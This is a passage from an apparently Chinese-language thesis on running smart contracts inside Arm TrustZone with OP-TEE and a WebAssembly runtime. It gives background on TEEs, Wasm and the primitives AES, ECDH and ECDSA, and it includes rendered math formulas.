1994\n年首次提出，其核心思想是将合约逻辑以代码形式固化在分布式账本中，合约一旦部署即不可随意更改，并将在满足特定触发条件时自动执行\n。当前主流区块链平台如 Ethereum、Polkadot、Cosmos\n等均提供了支持智能合约的运行机制。在智能合约执行过程中，用户通过提交交易触发合约函数调用，链上节点对合约代码进行解释或编译执行，并将执行结果和状态变更记录在区块中。由于执行过程和结果完全公开且不可篡改，智能合约被广泛应用于去中心化金融（DeFi）、链上治理、供应链管理和数字身份系统等场景中。</p>\n<h2 id=\"arm-trustzone\">2.3 Arm TrustZone</h2>\n<blockquote>\n<ul>\n<li>TrustZone 架构与 OP-TEE 实现</li>\n<li>TEE 对隐私保护的优势与常见应用</li>\n</ul>\n</blockquote>\n<p>Arm TrustZone 是 Arm\n处理器架构中的一项硬件级安全扩展技术，其核心思想是在单一物理处理器中划分出两个隔离的执行环境：安全世界（Secure\nWorld） 与 普通世界（Normal\nWorld），以此实现对敏感数据和关键任务的硬件隔离保护\n。当系统运行在普通世界时，无法访问安全世界的资源；而安全世界则具备完整的系统访问权限，可用于处理安全相关的逻辑，如密码学运算、密钥管理、用户身份认证等。</p>\n<p>这一隔离机制由硬件中的 安全监控器（Secure Monitor）\n进行管理，任务在两个世界之间的切换通过 安全监控调用（SMC）指令\n实现，确保了可信计算过程不被普通世界中的潜在恶意软件干扰。</p>\n<p>为支持在 TrustZone 平台上开发与运行可信应用，Arm\n官方主导并维护了开源项目 OP-TEE（Open Portable Trusted Execution\nEnvironment） 。OP-TEE 遵循 GlobalPlatform 标准接口，整体架构包括：</p>\n<ul>\n<li><strong>OP-TEE OS</strong>：运行在安全世界的 TEE\n核心，负责加载和调度受信任应用（Trusted Applications，TA）；</li>\n<li><strong>OP-TEE\nClient</strong>：运行在普通世界的用户态库与内核驱动，用于发起 TEE\n服务调用；</li>\n<li><strong>GlobalPlatform\nAPI</strong>：提供标准的开发接口与系统调用规范，便于跨平台移植与系统集成。</li>\n</ul>\n<p>通过\nOP-TEE，开发者可以为特定业务逻辑（如支付指令、密钥生成与签名、用户认证等）开发\nTA，并部署于受硬件保护的安全世界中运行，从而实现可信计算。</p>\n<p>在隐私保护领域，TEE 的主要优势包括：</p>\n<ul>\n<li><strong>计算过程私密性强</strong>：外部系统无法窥探 TEE\n内部的指令执行过程与数据状态；</li>\n<li><strong>数据加解密安全性高</strong>：密钥及加解密过程始终保留在 TEE\n内部，不易被提取；</li>\n</ul>\n<p>基于以上优势，TEE\n技术已广泛应用于移动支付、数字身份认证、数字版权管理（DRM）、医疗数据保护等场景。在区块链系统中，将智能合约的隐私计算部分迁移至\nTrustZone\n中执行，有助于弥补传统链上合约在数据隐私与执行可控性方面的缺陷，成为构建“链下可信执行+链上可验证”架构的重要支撑技术。</p>\n<h2 id=\"webassembly\">2.4 WebAssembly</h2>\n<blockquote>\n<ul>\n<li>WebAssembly 技术简介与优势</li>\n<li>Wasm\n在区块链与智能合约中的应用现状（CosmWasm、Polkadot，无法将合约执行环境移植到TEE中）</li>\n</ul>\n</blockquote>\n<p>WebAssembly（Wasm）是一种轻量级的二进制指令格式，最初由 W3C\n提出，用于在 Web 浏览器中高效、安全地运行代码 。开发者可以使用\nC、C++、Rust 等高级语言编写程序，并将其编译为 Wasm\n模块，实现跨平台、近原生性能的代码执行。Wasm\n具备启动快、体积小、沙箱隔离、安全性强等特点，现已广泛应用于边缘计算、物联网等资源受限场景。</p>\n<p>在区块链领域，Wasm 逐渐被用于替代传统虚拟机执行智能合约。Cosmos\n生态中的 CosmWasm 模块与 Polkadot 平台的 ink! 均引入了基于 Wasm\n的合约机制，实现了更高的语言灵活性和跨平台能力。然而，这些平台普遍依赖\nRust 标准库，合约执行环境复杂，无法直接部署在受限的 TEE 中；同时，如\nPolkadot 等平台本身架构较重，不适用于轻量化部署需求。 </p>\n<p>因此，本文采用 Wasm Micro\nRuntime（WAMR）等轻量运行时，将合约执行模块迁移至 TrustZone\n安全世界。该方案不仅简化了合约开发与部署流程，也为资源受限环境中的可信智能合约执行提供了可行路径。</p>\n<h2 id=\"密码学基础原语\">2.5 密码学基础原语</h2>\n<blockquote>\n<ul>\n<li>对称加密：AES</li>\n<li>密钥协商：ECDH</li>\n<li>数字签名：ECDSA</li>\n</ul>\n</blockquote>\n<p>本系统在设计中引入多种基础密码学原语，主要包括对称加密算法\nAES、椭圆曲线密钥协商协议 ECDH 以及数字签名算法\nECDSA，分别用于保护敏感数据、建立安全通信通道以及验证身份与数据完整性。</p>\n<h3 id=\"对称加密算法aes\">2.5.1 对称加密算法：AES</h3>\n<p>高级加密标准（Advanced Encryption\nStandard，AES）是一种广泛应用的分组对称加密算法，被美国国家标准与技术研究院（NIST）采纳为联邦加密标准\n。AES 使用固定长度的 128 位分组进行加密，支持 128、192 和 256\n位的密钥长度，在本系统中使用 AES-256 模式进行 VC（可验证凭证）加密。</p>\n<p>AES\n的基本加密过程包括多个轮次的替代（SubBytes）、行移位（ShiftRows）、列混淆（MixColumns）和轮密钥加（AddRoundKey）等操作，其数学基础是有限域\nGF(2⁸) 上的代数运算。形式上，对于明文 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.699ex\" height=\"1.545ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 751 683\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g></g></g></svg></mjx-container></span>、密钥 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.011ex\" height=\"1.545ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 889 683\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43E\" d=\"M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z\"/></g></g></g></svg></mjx-container></span>，加密输出为：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"14.301ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 6321.2 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1037.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2093.6,0)\"><g data-mml-node=\"mtext\"><path data-c=\"41\" d=\"M255 0Q240 3 140 3Q48 3 39 0H32V46H47Q119 49 139 88Q140 91 192 245T295 553T348 708Q351 716 366 716H376Q396 715 400 709Q402 707 508 390L617 67Q624 54 636 51T687 46H717V0H708Q699 3 581 3Q458 3 437 0H427V46H440Q510 46 510 64Q510 66 486 138L462 209H229L209 150Q189 91 189 85Q189 72 209 59T259 46H264V0H255ZM447 255L345 557L244 256Q244 255 345 255H447Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(750,0)\"/><path data-c=\"53\" d=\"M55 507Q55 590 112 647T243 704H257Q342 704 405 641L426 672Q431 679 436 687T446 700L449 704Q450 704 453 704T459 705H463Q466 705 472 699V462L466 456H448Q437 456 435 459T430 479Q413 605 329 646Q292 662 254 662Q201 662 168 626T135 542Q135 508 152 480T200 435Q210 431 286 412T370 389Q427 367 463 314T500 191Q500 110 448 45T301 -21Q245 -21 201 -4T140 27L122 41Q118 36 107 21T87 -7T78 -21Q76 -22 68 -22H64Q61 -22 55 -16V101Q55 220 56 222Q58 227 76 227H89Q95 221 95 214Q95 182 105 151T139 90T205 42T305 24Q352 24 386 62T420 155Q420 198 398 233T340 281Q284 295 266 300Q261 301 239 306T206 314T174 325T141 343T112 367T85 402Q55 451 55 507Z\" transform=\"translate(1431,0)\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(2020,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D43E\" d=\"M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z\"/></g></g></g><g data-mml-node=\"mo\" transform=\"translate(4792.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5181.2,0)\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5932.2,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span></p>\n<p>其中 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.05ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.719ex\" height=\"1.645ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 760 727\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g></g></g></svg></mjx-container></span> 表示密文，仅持有密钥\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.011ex\" height=\"1.545ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 889 683\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43E\" d=\"M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z\"/></g></g></g></svg></mjx-container></span> 方可解密恢复原始数据。</p>\n<h3 id=\"密钥协商协议ecdh\">2.5.2 密钥协商协议：ECDH</h3>\n<p>椭圆曲线 Diffie-Hellman（Elliptic Curve\nDiffie-Hellman，ECDH）是一种基于椭圆曲线密码学的密钥交换协议，可在不安全信道中协商出共享密钥\n。其安全性基于椭圆曲线离散对数难题。</p>\n<p>具体而言，通信双方分别拥有密钥对 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"15.53ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 6864.2 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mo\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(389,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-152.7) scale(0.707)\"><path data-c=\"1D434\" d=\"M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1522.3,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1967,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(675,-152.7) scale(0.707)\"><path data-c=\"1D434\" d=\"M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3500.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4555.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-152.7) scale(0.707)\"><path data-c=\"1D434\" d=\"M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(5689.2,0)\"><path data-c=\"1D43A\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6475.2,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"15.573ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 6883.3 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mo\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(389,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-150) scale(0.707)\"><path data-c=\"1D435\" d=\"M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1528.7,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1973.4,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(675,-150) scale(0.707)\"><path data-c=\"1D435\" d=\"M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 